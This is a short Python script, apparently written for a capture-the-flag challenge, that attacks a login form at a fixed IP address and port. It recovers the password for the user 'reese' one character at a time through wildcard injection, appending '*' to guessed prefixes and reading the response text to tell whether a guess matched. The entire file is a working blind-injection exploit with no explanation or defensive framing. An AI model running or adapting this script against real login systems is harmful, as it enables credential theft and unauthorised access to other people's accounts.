import requests

URL = 'http://64.227.43.207:31071/login'
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567890~!@#$%^&()_+=-{}[]\|;:,./?<>'

password = ''
while True:
    found_some = False
    for char in charset:
        password_try = password + char + '*'
        r = requests.post(URL, data=[('username', 'reese'), ('password', password_try)])
        if 'No search results' in r.text:
            found_some = True
            password += char
            print('New char found. Current password: ' + password)
            break

    if not found_some:
        break
